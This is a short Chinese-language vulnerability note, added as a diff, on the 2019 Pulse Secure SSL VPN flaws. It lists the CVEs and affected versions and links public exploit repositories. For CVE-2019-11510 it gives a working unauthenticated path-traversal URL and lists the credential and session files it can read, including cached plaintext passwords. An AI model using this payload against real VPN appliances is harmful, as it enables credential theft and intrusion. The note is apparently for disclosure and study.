@@ -1,0 +1,56 @@
+Pulse-Secure-SSL-VPN-CVE-2019
+漏洞编号：
+CVE-2019-11510——任意文件读取（无需授权）
+
+CVE-2019-11542——堆栈缓冲区溢出（管理员权限）
+
+CVE-2019-11539——命令注入（管理员权限）
+
+CVE-2019-11538——通过NFS读取任意文件（用户权限）
+
+CVE-2019-11508——通过NFS写入任意文件（用户权限）
+
+CVE-2019-11540——跨站脚本包含（需授权）
+
+CVE-2019-11507——跨站脚本（需授权）
+
+影响版本
+Pulse Connect Secure 9.0R1 – 9.0R3.3
+
+Pulse Connect Secure 8.3R1 – 8.3R7
+
+Pulse Connect Secure 8.2R1 – 8.2R12
+
+Pulse Connect Secure 8.1R1 – 8.1R15
+
+Pulse Policy Secure 9.0R1 – 9.0R3.3
+
+Pulse Policy Secure 5.4R1 – 5.4R7
+
+Pulse Policy Secure 5.3R1 – 5.3R12
+
+Pulse Policy Secure 5.2R1 – 5.2R12
+
+Pulse Policy Secure 5.1R1 – 5.1R15
+
+CVE-2019-11510: 在不需授权的情况下可以读取系统任意文件
+/etc/passwd
+/etc/hosts
+/data/runtime/mtmp/system
+/data/runtime/mtmp/lmdb/dataa/data.mdb
+/data/runtime/mtmp/lmdb/dataa/lock.mdb
+/data/runtime/mtmp/lmdb/randomVal/data.mdb
+/data/runtime/mtmp/lmdb/randomVal/lock.mdb 
+
+例：https://xxx/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
+Vpn用户和密码hash存储mtmp/system 中，dataa/data.mdb 存储这用户登陆后缓存的明文密码，randomVal/data.mdb 存储着用户Session。攻击者可以利用该漏洞获取账号密码登录后台。
+
+CVE-2019-11510 exp
+https://github.com/projectzeroindia/CVE-2019-11510
+
+CVE-2019-11539
+https://github.com/0xDezzy/CVE-2019-11539
+
+相关链接：
+
+https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html https://www.anquanke.com/post/id/185080
